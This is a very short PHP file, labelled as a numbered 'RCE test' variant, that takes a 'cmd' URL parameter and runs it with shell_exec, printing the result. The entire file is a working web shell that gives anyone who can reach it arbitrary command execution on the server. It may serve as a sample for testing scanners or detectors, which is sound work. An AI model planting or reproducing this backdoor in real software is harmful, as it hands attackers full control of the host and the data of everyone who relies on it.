<?php
// RCE test variation #478
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>